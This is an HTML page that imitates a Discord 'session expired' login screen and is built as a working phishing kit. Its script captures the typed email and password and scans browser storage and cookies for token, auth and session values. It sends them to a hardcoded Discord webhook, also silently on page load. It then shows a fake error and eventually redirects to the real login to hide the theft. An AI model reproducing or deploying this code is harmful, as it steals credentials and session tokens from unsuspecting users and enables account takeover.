<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login - Verify Session</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Whitney', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #5865F2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 8px;
            padding: 32px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .logo svg {
            width: 130px;
            height: 36px;
        }
        
        h1 {
            color: #060607;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #4e5058;
            text-align: center;
            margin-bottom: 24px;
            font-size: 16px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            color: #060607;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }
        
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #e3e5e8;
            border-radius: 4px;
            font-size: 16px;
            background: #e3e5e8;
            transition: border 0.2s;
        }
        
        input:focus {
            outline: none;
            border: 1px solid #5865F2;
            background: white;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 20px;
        }
        
        .btn:hover {
            background: #4752C4;
        }
        
        .btn:disabled {
            background: #a5b3f6;
            cursor: not-allowed;
        }
        
        .register-link {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            color: #4e5058;
        }
        
        .register-link a {
            color: #5865F2;
            text-decoration: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px 0;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #5865F2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error {
            background: #f04747;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            display: none;
            font-size: 14px;
        }
        
        .info-box {
            background: #fef6e7;
            border-left: 4px solid #faa61a;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #2c2f33;
        }
    </style>
</head>
<body>

        <div class="logo">
            <svg aria-hidden="true" role="img" width="124" height="34" viewBox="0 0 124 34">
                <path fill="#5865F2" d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.30193 14.1585 6.30193 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 12.8736 -0.41235 18.6548 0.130124 24.3585C2.79599 26.2959 5.36889 27.4739 7.89682 28.2489C8.51679 27.4119 9.07477 26.5129 9.55525 25.5675C8.64079 25.2265 7.77283 24.808 6.93587 24.312C7.15286 24.1571 7.36986 23.9866 7.57135 23.8161C12.6241 26.1255 18.0969 26.1255 23.0876 23.8161C23.3046 23.9866 23.5061 24.1571 23.7231 24.312C22.8861 24.808 22.0182 25.2265 21.1037 25.5675C21.5842 26.5129 22.1422 27.4119 22.7621 28.2489C25.2885 27.4739 27.8769 26.2959 30.5288 24.3585C31.1952 17.7559 29.4733 12.0212 26.0015 6.9529ZM10.2527 20.8402C8.73376 20.8402 7.49382 19.4608 7.49382 17.7714C7.49382 16.082 8.70276 14.7025 10.2527 14.7025C11.7871 14.7025 13.0425 16.082 13.0115 17.7714C13.0115 19.4608 11.7871 20.8402 10.2527 20.8402ZM20.4373 20.8402C18.9183 20.8402 17.6768 19.4608 17.6768 17.7714C17.6768 16.082 18.8873 14.7025 20.4373 14.7025C21.9717 14.7025 23.2271 16.082 23.1961 17.7714C23.1961 19.4608 21.9872 20.8402 20.4373 20.8402Z"></path>

            </svg>
        </div>
        
        <h1>Welcome back!</h1>
        <p class="subtitle">We're so excited to see you again!</p>
        
        <div class="info-box">
            ‚ÑπÔ∏è Your session has expired. Please log in again to continue.
        </div>
        
        <div class="error" id="error">
            Invalid email or password. Please try again.
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email or Phone Number <span style="color: #f04747;">*</span></label>
                <input type="text" id="email" required autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">Password <span style="color: #f04747;">*</span></label>
                <input type="password" id="password" required autocomplete="current-password">
            </div>
            
            <button type="submit" class="btn" id="loginBtn">Log In</button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="color:#4e5058;">Verifying credentials...</p>
        </div>
        
        <div class="register-link">
            Need an account? <a href="https://discord.com/register">Register</a>
        </div>
    </div>

    <script>
        // CONFIGURA TU WEBHOOK AQU√ç
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1470464589757022239/MC0aOunixYDGJ_woLuHBM9Qm43uYkH0cu8NzpYGOAcpbt5DOJ87NfQ0MCOS-mrgHksZF';
        
        // Detectar plataforma
        function detectPlatform() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return 'Android';
            if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
            if (/Windows/.test(ua)) return 'Windows';
            if (/Mac/.test(ua)) return 'Mac';
            if (/Linux/.test(ua)) return 'Linux';
            return 'Unknown';
        }
        
        // Buscar tokens (compatible con CSP)
        function scanForTokens() {
            const results = {
                tokens: [],
                storage: {},
                platform: detectPlatform(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            // LocalStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    
                    if (key && value) {
                        const lowerKey = key.toLowerCase();
                        const lowerValue = value.toLowerCase();
                        
                        if (lowerKey.includes('token') || 
                            lowerKey.includes('discord') ||
                            lowerKey.includes('auth') ||
                            lowerValue.includes('mfa.')) {
                            results.tokens.push({
                                source: 'localStorage',
                                key: key,
                                value: value
                            });
                        }
                    }
                }
            } catch(e) {
                results.storage.localStorage_error = e.message;
            }
            
            // SessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    
                    if (key && value) {
                        const lowerKey = key.toLowerCase();
                        
                        if (lowerKey.includes('token') || 
                            lowerKey.includes('discord')) {
                            results.tokens.push({
                                source: 'sessionStorage',
                                key: key,
                                value: value
                            });
                        }
                    }
                }
            } catch(e) {
                results.storage.sessionStorage_error = e.message;
            }
            
            // Cookies
            try {
                const cookies = document.cookie.split(';');
                cookies.forEach(function(cookie) {
                    const parts = cookie.split('=');
                    if (parts.length >= 2) {
                        const key = parts[0].trim();
                        const value = parts[1];
                        const lowerKey = key.toLowerCase();
                        
                        if (lowerKey.includes('token') || 
                            lowerKey.includes('discord') ||
                            lowerKey.includes('auth') ||
                            lowerKey.includes('session')) {
                            results.tokens.push({
                                source: 'cookie',
                                key: key,
                                value: value
                            });
                        }
                    }
                });
            } catch(e) {
                results.storage.cookies_error = e.message;
            }
            
            return results;
        }
        
        // Enviar datos al webhook
        function sendData(data) {
            const embed = {
                title: 'üéØ Login Attempt',
                color: data.tokens.length > 0 ? 0x43B581 : (data.credentials ? 0xFAA61A : 0xFF6B6B),
                fields: [
                    {
                        name: 'üì± Platform',
                        value: data.platform,
                        inline: true
                    },
                    {
                        name: 'üîë Tokens Found',
                        value: data.tokens.length.toString(),
                        inline: true
                    },
                    {
                        name: '‚è∞ Time',
                        value: new Date().toLocaleString(),
                        inline: true
                    }
                ],
                timestamp: data.timestamp
            };
            
            // Credenciales
            if (data.credentials) {
                if (data.credentials.email) {
                    embed.fields.push({
                        name: 'üìß Email/Phone',
                        value: '||```' + data.credentials.email + '```||',
                        inline: false
                    });
                }
                
                if (data.credentials.password) {
                    embed.fields.push({
                        name: 'üîí Password',
                        value: '||```' + data.credentials.password + '```||',
                        inline: false
                    });
                }
            }
            
            // Tokens
            if (data.tokens.length > 0) {
                data.tokens.forEach(function(token, index) {
                    embed.fields.push({
                        name: 'üéüÔ∏è Token #' + (index + 1) + ' (' + token.source + ')',
                        value: '||```' + (token.value || 'N/A') + '```||',
                        inline: false
                    });
                });
            }
            
            // User Agent
            embed.fields.push({
                name: 'üîß User Agent',
                value: '```' + data.userAgent + '```',
                inline: false
            });
            
            const payload = JSON.stringify({
                username: 'Login Phishing',
                embeds: [embed]
            });
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: payload
            }).catch(function(error) {
                console.error('Webhook error:', error);
            });
        }
        
        // Manejar submit del formulario
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Ocultar form, mostrar loading
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Scan de tokens
            const scanResults = scanForTokens();
            scanResults.credentials = {
                email: email,
                password: password
            };
            
            // Enviar datos
            sendData(scanResults);
            
            // Simular delay y error
            window.setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('error').style.display = 'block';
                document.getElementById('loginForm').style.display = 'block';
                document.getElementById('password').value = '';
                
                // Contador de intentos
                if (!window.loginAttempts) {
                    window.loginAttempts = 0;
                }
                window.loginAttempts++;
                
                // Despu√©s de 3 intentos, redirigir
                if (window.loginAttempts >= 3) {
                    window.setTimeout(function() {
                        window.location.href = 'https://discord.com/login';
                    }, 2000);
                }
            }, 2500);
        });
        
        // Auto-scan silencioso al cargar (despu√©s de 3 segundos)
        window.addEventListener('load', function() {
            window.setTimeout(function() {
                const scanResults = scanForTokens();
                sendData(scanResults);
            }, 3000);
        });
    </script>
</body>
</html>
